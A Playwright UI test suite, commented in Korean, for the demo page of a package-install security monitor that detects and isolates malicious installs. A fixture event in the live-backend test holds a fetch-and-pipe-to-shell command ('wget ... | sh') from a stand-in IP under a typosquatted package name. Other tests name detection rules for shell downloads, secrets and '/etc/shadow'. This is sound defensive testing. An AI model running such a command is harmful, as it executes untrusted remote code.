/* 11/04e 「시연」 페이지 회귀(#/demo) — 대시보드 시연 카드를 독립 페이지로 옮김
   1 메뉴 노출: 관리자 + 서버 시연 켜짐일 때만 사이드바 「시연」(조회자 · ?demo=off 면 없음, 주소로 들어오면 안내)
   2 대시보드에 시연 카드 없음
   3 시나리오 목록 = 설치 샌드박스 6개 + 연쇄(런타임) + 정상 설치 대조군, 고르면 설명 · 예상 결과
   4 shell 실행: 단계 흐름(시작 → 커널 이벤트 → 규칙 판정 → 증거 수집 → 격리) 차례로, 단계마다 도착 시각 · 직전 대비 ms, 커널 이벤트 실시간 수 · 최근 줄
   5 「왜」 카드: 무엇을(패키지 · 컨테이너 · comm/pid) · 왜(규칙 · 판정 · 조건 문장 · 이벤트 원문 강조) · 어떻게(증거 로그 · 파일 변경 · 프로세스 · 증거 ms · kill ms) · 보고서 · 정책 링크
   6 대조군(benign): 위반 없음 → 「통과」, 증거 · 격리 단계는 건너뜀
   7 연쇄(chain): 기본 정책 no-shell-download 가 1단계에서 먼저 격리 · 「연쇄 진행 1/3(dryRun 연쇄 규칙 chain-download-secrets)」 · 단계 3개(1단계만 이벤트) — 11/04e 사용자 결정(메인 전달): 연쇄 완성 장면은 따로 녹화
   8 실행 중 차단: 실행 단추 잠김 + 이유, 다른 곳에서 시작해도(409) 「이미 실행 중」
   9 live: 「왜」 필드가 없으면 그 칸만 「정보 없음」
   10 1920×1080 한 화면(문서 · 본문 스크롤 0, 세 열이 화면 안) · 글자 12px 이상
   콘솔 오류 0
   실행: (mock/ 에서) python3 -m http.server 8768 --bind 127.0.0.1 → BASE=http://127.0.0.1:8768/index.html PLAYWRIGHT=<playwright 경로> node tests/demo-page-1104.cjs
         (VERBOSE=1 · ONLY=정규식 · SHOTS=1 → screenshots/demo-page-1104-*.png) */
const fs = require('fs');
const path = require('path');
const { chromium } = require(process.env.PLAYWRIGHT || 'playwright');
const BASE = (process.env.BASE || 'http://127.0.0.1:8768').replace(/\/index\.html$/, '').replace(/\/$/, '') + '/index.html';
const SHOTS = process.env.SHOTS === '1';
const SHOT_DIR = path.join(__dirname, '..', 'screenshots');
const results = []; const consoleErrors = [];
const T = async (name, fn) => {
  if (process.env.ONLY && !new RegExp(process.env.ONLY).test(name)) return;
  try { await fn(); results.push([true, name]); } catch (e) { results.push([false, name, e.message.split('\n')[0]]); }
  if (process.env.VERBOSE) { const r = results[results.length - 1]; console.log(`${r[0] ? 'PASS' : 'FAIL'}  ${r[1]}${r[2] ? '  — ' + r[2] : ''}`); }
};
const ok = (c, m) => { if (!c) throw new Error(m); };
const STEPS = ['start', 'events', 'match', 'evidence', 'outcome'];
const ALL = ['all', 'shell', 'revshell', 'direct-ip', 'domain', 'dns-exfil', 'benign', 'chain']; // 백엔드 GET /api/demo scenarios 순서(메인 전달 11/04e)

(async () => {
  const br = await chromium.launch();
  const newPage = async (opts = {}) => {
    const { allow404, ...ctxOpts } = opts;
    const ctx = await br.newContext(Object.assign({ viewport: { width: 1920, height: 1080 } }, ctxOpts));
    const pg = await ctx.newPage();
    await pg.route('https://api.osv.dev/**', (r) => r.fulfill({ status: 200, contentType: 'application/json', headers: { 'Access-Control-Allow-Origin': '*' }, body: '{}' }));
    // allow404: 가짜 live 백엔드(일부러 없는 경로 — 증거 · 라이선스 등)의 404 자원 로드 오류만 뺀다
    pg.on('console', (m) => { if (m.type() === 'error' && !(opts.allow404 && /Failed to load resource: .*404/.test(m.text()))) consoleErrors.push(`${pg.url()} ${m.text()}`); });
    pg.on('pageerror', (e) => consoleErrors.push(`${pg.url()} PAGEERROR ${e.message}`));
    pg.done = () => ctx.close();
    return pg;
  };
  const go = async (pg, hash, extra = '', as = 'admin') => { await pg.goto(`${BASE}?source=sim&as=${as}${extra}#${hash}`); await pg.waitForSelector('.page-title', { timeout: 6000 }); await pg.waitForTimeout(450); };
  const shot = async (pg, name) => { if (!SHOTS) return; fs.mkdirSync(SHOT_DIR, { recursive: true }); await pg.screenshot({ path: path.join(SHOT_DIR, `demo-page-1104-${name}.png`), fullPage: true }); };
  const stepState = (pg) => pg.$$eval('[data-part="demo-steps"] > li[data-step]', (els) => els.map((e) => [e.dataset.step, e.dataset.state]));
  const outcome = (pg) => pg.$eval('[data-part="demo-outcome"]', (e) => [e.dataset.outcome, e.textContent.trim()]).catch(() => [null, '']);
  async function run(pg, scn) {
    await pg.click(`[data-scenario="${scn}"]`);
    await pg.click('[data-action="demo-run"]');
  }
  const waitDone = (pg, ms = 12000) => pg.waitForSelector('[data-part="demo-outcome"][data-outcome]:not([data-outcome="running"])', { timeout: ms });

  await T('1 메뉴: 관리자 + 시연 켜짐일 때만 「시연」, 조회자 · demo=off 는 없음 · 주소로 오면 안내', async () => {
    const pg = await newPage();
    await go(pg, '/');
    const link = await pg.$eval('.side-nav .nav-link[data-to="/demo"]', (e) => [e.textContent.trim(), e.getClientRects().length > 0]).catch(() => null);
    ok(link && link[0].includes('시연') && link[1], `관리자 메뉴 ${JSON.stringify(link)}`);
    await pg.click('.side-nav .nav-link[data-to="/demo"]'); await pg.waitForTimeout(400);
    ok(await pg.textContent('.page-title') === '시연', '화면 이름');
    ok(await pg.locator('[data-part="demo-page"]').count() === 1, '시연 페이지 없음');
    for (const [extra, as] of [['', 'viewer'], ['&demo=off', 'admin']]) {
      const p = await newPage();
      await go(p, '/', extra, as);
      ok(await p.locator('.side-nav .nav-link[data-to="/demo"]').count() === 0, `${as}${extra} 메뉴가 보임`);
      await go(p, '/demo', extra, as);
      ok(await p.locator('[data-part="demo-page"]').count() === 0 && (await p.textContent('#page')).includes('시연을 쓸 수 없습니다'), `${as}${extra} 안내`);
      await p.done();
    }
    await pg.done();
  });

  await T('2 대시보드에 시연 카드 없음', async () => {
    const pg = await newPage();
    await go(pg, '/');
    ok(await pg.locator('[data-section="demo"], .demo-card').count() === 0, '시연 카드가 남음');
    await pg.done();
  });

  await T('3 시나리오: 설치 6 + 연쇄 + 대조군, 고르면 설명 · 예상 결과', async () => {
    const pg = await newPage();
    await go(pg, '/demo');
    const keys = await pg.$$eval('[data-scenario]', (els) => els.map((e) => e.dataset.scenario));
    ok(JSON.stringify(keys) === JSON.stringify(ALL), `시나리오 ${keys}`);
    const exp = await pg.$$eval('[data-scenario]', (els) => Object.fromEntries(els.map((e) => [e.dataset.scenario, e.querySelector('[data-part="expect"]')?.dataset.expect])));
    ok(exp.shell === 'isolated' && exp.chain === 'isolated' && exp.benign === 'passed', `예상 ${JSON.stringify(exp)}`); // chain 은 기본 정책이 1단계에서 격리
    await pg.click('[data-scenario="chain"]');
    ok(await pg.$eval('[data-scenario="chain"]', (e) => e.getAttribute('aria-pressed')) === 'true', '선택');
    const d = await pg.textContent('[data-part="scenario-desc"]');
    ok(d.includes('dryRun') && d.includes('1단계') && d.includes('no-shell-download'), `설명 "${d}"`);
    await pg.done();
  });

  await T('4 shell: 단계 흐름 차례로 · 도착 시각 · 직전 대비 ms · 커널 이벤트 수 · 최근 줄', async () => {
    const pg = await newPage();
    await go(pg, '/demo');
    await run(pg, 'shell');
    await pg.waitForSelector('[data-part="demo-outcome"][data-outcome="running"]', { timeout: 2000 });
    await shot(pg, 'running-1920');
    const mid = await stepState(pg);
    ok(mid[0][1] === 'done' && mid.some(([, s]) => s === 'active' || s === 'todo'), `실행 중 ${JSON.stringify(mid)}`);
    await waitDone(pg);
    const st = await stepState(pg);
    ok(JSON.stringify(st.map((x) => x[0])) === JSON.stringify(STEPS), `단계 ${JSON.stringify(st)}`);
    ok(st.every(([, s]) => s === 'done'), `끝 ${JSON.stringify(st)}`);
    const [oc, txt] = await outcome(pg);
    ok(oc === 'isolated' && txt.includes('격리'), `결과 ${oc} ${txt}`);
    const times = await pg.$$eval('[data-part="demo-steps"] > li[data-step]', (els) => els.map((e) => [e.dataset.at, e.dataset.deltaMs, e.querySelector('[data-part="step-at"]')?.textContent.trim(), e.querySelector('[data-part="step-delta"]')?.textContent.trim()]));
    ok(times.every((t) => t[0] && !Number.isNaN(Date.parse(t[0])) && /^\d\d:\d\d:\d\d\.\d{3}$/.test(t[2])), `도착 시각 ${JSON.stringify(times)}`);
    ok(times.slice(1).every((t) => /^\d+$/.test(t[1]) && /^\+[\d,]+ ms$/.test(t[3])), `직전 대비 ${JSON.stringify(times)}`);
    for (let i = 1; i < times.length; i++) ok(Date.parse(times[i][0]) >= Date.parse(times[i - 1][0]), `시각 순서 ${i}`);
    const n = Number((await pg.textContent('[data-part="event-count"]')).replace(/[^\d]/g, ''));
    ok(n >= 3, `커널 이벤트 ${n}`);
    const lines = await pg.$$eval('[data-part="event-lines"] li', (els) => els.map((e) => e.textContent));
    ok(lines.length >= 2 && lines.length <= 6, `최근 줄 ${lines.length}`);
    ok(lines.some((l) => l.includes('wget')), '최근 줄에 위반 이벤트');
    await shot(pg, 'isolated-1920');
    await pg.setViewportSize({ width: 1440, height: 900 }); await pg.waitForTimeout(300); await shot(pg, 'isolated-1440');
    await pg.done();
  });

  await T('5 「왜」 카드: 무엇을 · 왜(규칙 · 판정 · 조건 · 원문 강조) · 어떻게(증거 · ms) · 링크', async () => {
    const pg = await newPage();
    await go(pg, '/demo');
    await run(pg, 'shell'); await waitDone(pg);
    const W = '[data-part="why"]';
    const what = await pg.textContent(`${W} [data-why="what"]`);
    ok(what.includes('./reqeusts') && /sg-install-demo-\d+/.test(what) && /sh/.test(what) && /pid \d+/.test(what), `무엇을 "${what}"`);
    const rule = await pg.textContent(`${W} [data-part="why-rule"]`);
    ok(['no-shell-download', 'pipe-to-shell', 'sandbox-secrets', 'sensitive-files'].includes(rule.trim()), `규칙 "${rule}"`);
    ok((await pg.textContent(`${W} [data-why="why"]`)).includes('격리'), '판정');
    const cond = await pg.textContent(`${W} [data-part="why-condition"]`);
    ok(cond.length > 10 && !cond.includes('정보 없음'), `조건 "${cond}"`);
    const mark = await pg.$eval(`${W} [data-part="why-event"] mark`, (e) => e.textContent).catch(() => '');
    ok(mark && (mark.includes('wget') || mark.includes('| sh') || mark.includes('/etc/shadow')), `강조 "${mark}"`);
    const ev = await pg.$$eval(`${W} [data-part="why-evidence"] [data-ev]`, (els) => els.map((e) => e.dataset.ev));
    ok(JSON.stringify(ev) === JSON.stringify(['logs', 'changes', 'processes']), `증거 ${ev}`);
    const evMs = await pg.textContent(`${W} [data-part="evidence-ms"]`), killMs = await pg.textContent(`${W} [data-part="kill-ms"]`);
    ok(/\d+ ms/.test(evMs) && /\d+ ms/.test(killMs), `ms ${evMs} ${killMs}`);
    const rep = await pg.getAttribute(`${W} [data-action="open-report"]`, 'href'), pol = await pg.getAttribute(`${W} [data-action="open-policy"]`, 'href');
    ok(/^#\/report\?(case|install)=/.test(rep) && pol === `#/policies?id=${encodeURIComponent(rule.trim())}`, `링크 ${rep} ${pol}`);
    await pg.done();
  });

  await T('6 대조군: 위반 없음 → 통과, 증거 · 격리 단계 건너뜀', async () => {
    const pg = await newPage();
    await go(pg, '/demo');
    await run(pg, 'benign'); await waitDone(pg);
    const [oc, txt] = await outcome(pg);
    ok(oc === 'passed' && txt.includes('통과'), `결과 ${oc} ${txt}`);
    const st = Object.fromEntries(await stepState(pg));
    ok(st.start === 'done' && st.events === 'done' && st.match === 'done' && st.evidence === 'skip' && st.outcome === 'done', `단계 ${JSON.stringify(st)}`);
    ok((await pg.textContent('[data-step="match"]')).includes('위반 없음'), '판정 단계 문구');
    ok((await pg.textContent('[data-part="why"]')).includes('걸린 규칙 없음'), '「왜」 카드 문구');
    await shot(pg, 'passed-1920');
    await pg.done();
  });

  await T('7 연쇄: 기본 정책이 1단계에서 먼저 격리 · 연쇄 진행 1/3(dryRun) · 단계 3개(1단계만 이벤트)', async () => {
    const pg = await newPage();
    await go(pg, '/demo');
    await run(pg, 'chain'); await waitDone(pg);
    const [oc, txt] = await outcome(pg);
    ok(oc === 'isolated' && txt.includes('기본 정책이 1단계에서 먼저 막음') && txt.includes('연쇄 진행 1/3') && txt.includes('chain-download-secrets'), `결과 ${oc} ${txt}`);
    ok((await pg.textContent('[data-part="why-rule"]')).trim() === 'no-shell-download', '판정 규칙(1단계 격리)');
    const steps = await pg.$$eval('[data-part="seq-steps"] li', (els) => els.map((e) => [e.dataset.kind, e.dataset.matched, e.textContent]));
    ok(JSON.stringify(steps.map((s) => s[0])) === JSON.stringify(['exec', 'connect', 'open']), `단계 ${JSON.stringify(steps)}`);
    ok(JSON.stringify(steps.map((s) => s[1])) === JSON.stringify(['true', 'false', 'false']) && steps[0][2].includes('wget') && steps[1][2].includes('이어지지 않음'), `진행 ${JSON.stringify(steps)}`);
    ok((await pg.textContent('[data-part="seq"]')).includes('dryRun'), 'dryRun 표시');
    await pg.done();
  });

  await T('8 실행 중 차단: 단추 잠김 + 이유 · 다른 곳에서 시작(409)도 「이미 실행 중」', async () => {
    const pg = await newPage();
    await go(pg, '/demo');
    await pg.evaluate(() => UI.api.demoRun({ scenario: 'revshell' })); await pg.waitForTimeout(700);
    ok(await pg.$eval('[data-action="demo-run"]', (e) => e.disabled), '단추가 잠기지 않음');
    const note = await pg.textContent('[data-part="run-note"]');
    ok(note.includes('실행 중') && note.includes('90초'), `이유 "${note}"`);
    const r = await pg.evaluate(() => UI.api.demoRun({ scenario: 'shell' }).then(() => 'ok', (e) => e.status));
    ok(r === 409, `409 아님 ${r}`);
    await waitDone(pg);
    ok(!(await pg.$eval('[data-action="demo-run"]', (e) => e.disabled)), '끝나도 잠김');
    await pg.done();
  });

  await T('9 live: 「왜」 필드가 없으면 그 칸만 「정보 없음」', async () => {
    const pg = await newPage({ allow404: true });
    const API = 'http://127.0.0.1:8099';
    const now = Date.now(), at = (ms) => new Date(now - 60000 + ms).toISOString();
    // Run.explain(메인 전달 계약) — decidedBy 에 condition 이 없고, 세션에 isolation 이 없고, 증거는 404 → 그 칸만 「정보 없음」
    const run = { id: 'demo-1', scenario: 'shell', container: 'sg-install-demo-1', installId: 'ins-0101', startedAt: at(0), finishedAt: at(3000), status: 'finished', exitCode: 137, simulated: false, explain: null };
    const ev = { kind: 'exec', comm: 'sh', pid: 4242, args: 'sh -c wget -q -O- http://203.0.113.7/postinstall.sh | sh', timestamp: at(1200), containerName: run.container, containerId: 'c1', imageName: 'python:3.12-slim' };
    const session = { id: 'ins-0101', manager: 'pip', packages: ['./reqeusts'], container: run.container, image: 'python:3.12-slim', startedAt: at(0), finishedAt: at(3000), exitCode: 137, status: 'isolated', caseId: null,
      activity: { kinds: { exec: 2, open: 3, connect: 1, dns: 0 }, hosts: [], programs: [] }, violations: [{ event: ev, matched: true, ruleId: 'pipe-to-shell', action: 'kill', enforced: true, reason: 'pipe-to-shell: 금지 인자 패턴 "| sh"', count: 1 }], isolation: null };
    run.explain = { decidedBy: { ruleId: 'pipe-to-shell', description: '내려받은 내용을 바로 셸에 넘기는 패턴', action: 'kill', dryRun: false, enforced: true, reason: 'pipe-to-shell: 금지 인자 패턴 "| sh"', event: { kind: 'exec', timestamp: ev.timestamp, comm: 'sh', pid: 4242, args: ev.args, path: '', dstIp: '', dstPort: 0, dstHost: '', qtype: '' } }, sequence: null };
    const json = (b, s = 200) => ({ status: s, contentType: 'application/json', headers: { 'Access-Control-Allow-Origin': BASE.replace(/\/index\.html$/, '').replace(/(:\d+).*$/, '$1'), 'Access-Control-Allow-Credentials': 'true' }, body: JSON.stringify(b) });
    await pg.routeWebSocket(/127\.0\.0\.1:8099/, () => { /* 열린 채로 둔다 */ });
    await pg.route(`${API}/**`, (r) => {
      const u = new URL(r.request().url()), p = u.pathname;
      if (p === '/api/auth/me') return r.fulfill({ status: 404, contentType: 'text/plain', headers: json({}).headers, body: '404 page not found' });
      if (p === '/api/info') return r.fulfill(json({ source: 'gadget', gadgets: ['exec', 'open', 'connect'], enforceKill: true, gadgetVersion: 'v0.56.1', dnsResolve: 'ok', demo: true }));
      if (p === '/api/demo') return r.fulfill(json({ enabled: true, scenarios: ['all', 'shell'], running: null, last: run }));
      if (p === '/api/installs/ins-0101') return r.fulfill(json(session));
      if (p === '/api/events/recent') return r.fulfill(json([]));
      if (p === '/api/stats') return r.fulfill(json({ totalEvents: 0, eventsPerSec: 0, trend: [], killed: [], topContainers: [] }));
      if (p === '/api/policies') return r.fulfill(json([]));
      return r.fulfill({ status: 404, contentType: 'text/plain', headers: json({}).headers, body: '404 page not found' });
    });
    await pg.goto(`${BASE}?source=live&api=${API}#/demo`);
    await pg.waitForSelector('[data-part="demo-page"]', { timeout: 6000 }); await pg.waitForTimeout(1200);
    const W = '[data-part="why"]';
    ok((await pg.textContent(`${W} [data-part="why-rule"]`)).trim() === 'pipe-to-shell', '규칙(explain.decidedBy)');
    ok((await pg.textContent(`${W} [data-part="why-condition"]`)).includes('정보 없음'), '조건 칸 「정보 없음」');
    ok((await pg.textContent(`${W} [data-why="what"]`)).includes('pid 4242'), '프로세스');
    ok((await pg.textContent(`${W} [data-part="why-evidence"]`)).includes('정보 없음'), '증거 칸 「정보 없음」');
    ok((await pg.textContent(`${W} [data-part="kill-ms"]`)).includes('정보 없음'), 'kill ms 「정보 없음」');
    ok(await pg.$eval(`${W} [data-part="why-event"] mark`, (e) => e.textContent).then((t) => t.includes('| sh')), '원문 강조');
    await pg.done();
  });

  await T('10 1920×1080 한 화면 · 세 열 화면 안 · 글자 12px 이상', async () => {
    const pg = await newPage();
    await go(pg, '/demo');
    await run(pg, 'shell'); await waitDone(pg);
    const r = await pg.evaluate(() => {
      const se = document.scrollingElement, p = document.querySelector('#page');
      const cols = [...document.querySelectorAll('[data-part="demo-page"] > [data-col]')].map((e) => { const b = e.getBoundingClientRect(); return [e.dataset.col, b.top >= 0 && b.bottom <= innerHeight && b.right <= innerWidth && b.left >= 0]; });
      const small = [...document.querySelectorAll('[data-part="demo-page"] *')].filter((e) => e.getClientRects().length && [...e.childNodes].some((n) => n.nodeType === 3 && n.textContent.trim()) && parseFloat(getComputedStyle(e).fontSize) < (e.closest('.badge') ? 11.5 : 12)).map((e) => e.className + ':' + getComputedStyle(e).fontSize);
      const inner = [...document.querySelectorAll('[data-part="demo-page"] *')].filter((e) => /(auto|scroll)/.test(getComputedStyle(e).overflowY) && e.scrollHeight > e.clientHeight + 1).map((e) => e.className);
      return { doc: se.scrollHeight - innerHeight, page: p.scrollHeight - p.clientHeight, cols, small: small.slice(0, 5), inner };
    });
    ok(r.doc <= 0 && r.page <= 1, `스크롤 ${r.doc} ${r.page}`);
    ok(r.cols.length === 3 && r.cols.every((c) => c[1]), `열 ${JSON.stringify(r.cols)}`);
    ok(!r.small.length, `작은 글자 ${r.small}`);
    ok(!r.inner.length, `1920 에서 안쪽 스크롤 ${r.inner}`);
    // 다크 · 390 스크린샷
    const pd = await newPage({ colorScheme: 'dark' });
    await pd.addInitScript(() => { try { localStorage.setItem('supplyguard.theme', 'dark'); } catch { /* */ } });
    await go(pd, '/demo'); await run(pd, 'shell'); await waitDone(pd); await shot(pd, 'isolated-dark'); await pd.done();
    const pm = await newPage({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true });
    await go(pm, '/demo'); await run(pm, 'benign'); await waitDone(pm);
    ok(await pm.evaluate(() => document.documentElement.scrollWidth - innerWidth) <= 0, '390 가로 넘침');
    await shot(pm, 'passed-390'); await pm.done();
    await pg.done();
  });

  await br.close();
  const failed = results.filter((r) => !r[0]);
  if (!process.env.VERBOSE) results.forEach((r) => console.log(`${r[0] ? 'PASS' : 'FAIL'}  ${r[1]}${r[2] ? '  — ' + r[2] : ''}`));
  console.log(`\n${results.length - failed.length}/${results.length} 통과 · 콘솔 오류 ${consoleErrors.length}건`);
  consoleErrors.slice(0, 5).forEach((e) => console.log('  ', e));
  process.exit(failed.length || consoleErrors.length ? 1 : 0);
})();
